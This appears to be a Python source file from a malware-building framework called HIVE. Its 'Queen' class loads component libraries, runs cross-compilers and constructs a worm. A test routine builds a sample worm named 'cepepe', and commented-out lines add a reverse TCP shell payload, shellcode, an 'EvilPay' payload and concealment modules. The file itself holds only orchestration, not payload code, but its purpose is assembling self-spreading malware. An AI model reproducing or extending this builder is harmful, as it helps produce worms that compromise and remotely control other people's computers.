import os

from .mods.local_msg import LocalMSG
from .mods.py_pip_lib import PYTHON_PIP_LIBRARY_LINUX, PYTHON_PIP_LIBRARY_WINDOWS
from .Lib.library import Library
from .raw_worm_builder import RawWormBuilder
from .coder import Coder
from .worm_construtor import WormConstructor
from .compilers.master_compiler import MasterCompiler


# HIVE_MAIN_DIR = os.path.dirname(__file__)

class Queen:
    def __init__(self, builder_object: object):
        self.conf = builder_object

        self.DIR_HIVE = self.conf.DIR_HIVE
        self.DIR_HIVE_OUTPUT = self.conf.DIR_HIVE_OUT
        self.DIR_LIB_MAIN = os.path.join(self.DIR_HIVE, "Lib")
        self.DIR_ICONS = os.path.join(self.DIR_LIB_MAIN, "icons")
        self.PYTHON_PIP_LIBRARY_LINUX = PYTHON_PIP_LIBRARY_LINUX
        self.PYTHON_PIP_LIBRARY_WINDOWS = PYTHON_PIP_LIBRARY_WINDOWS


        self.msg = LocalMSG(self)
        



    
        


    def enter(self) -> None:
        self.library = Library(self)
        self.library.findItems()
        self.rawBuilder = RawWormBuilder(self, self.library)
        self.coder = Coder(self, self.rawBuilder)
        self.master_compiler = MasterCompiler(self)
        self.master_compiler.mountCore()
        self.wormConstructor = WormConstructor(self, self.rawBuilder, self.coder, self.master_compiler)
        


    def test(self) -> None:
        self.msg("msg", "Test HIVE")
        conf = {}
        print(self.conf.DEFAULT_COMPILER_CORE)
        print(self.conf.COMPILER_CONTAINER_NAME)
        print(self.conf.DEFAULT_LINKER_DLL)
        #self.master_compiler.coreInstall("CrossCompCore")
        self.rawBuilder.setWormName("cepepe")
        self.rawBuilder.Add("worm", "Kapucyn")
        # self.rawBuilder.Add("payload", "PyRevTcp")
        # self.rawBuilder.Add("scode", "MsgBoxA")
        #self.rawBuilder.Add("worm", "Asmek")
        # self.rawBuilder.Add("worm", "Montezuma")
        # self.rawBuilder.Add("module", "PyRawTcp")
        # self.rawBuilder.Add("shadow", "DigDug")
        # self.rawBuilder.addFoodAsVar("Ktext", "CharFood")
        # self.rawBuilder.Add("worm", "Pajtek")
        # self.rawBuilder.Add("module", "PajMod")
        # self.rawBuilder.Add("payload", "EvilPay")
        # self.rawBuilder.Add("compiler", "MinGW_x64_Nasm", "Asmek")
        #self.rawBuilder.Add("worm", "MultiTest")
        #self.rawBuilder.Add("module", "NasmMod")

        # self.rawBuilder.test()
        self.rawBuilder.showWorm()
        self.wormConstructor.buildWorm(options=conf)

    
        



    def Run(self) -> None:
        self.enter()
        self.test()





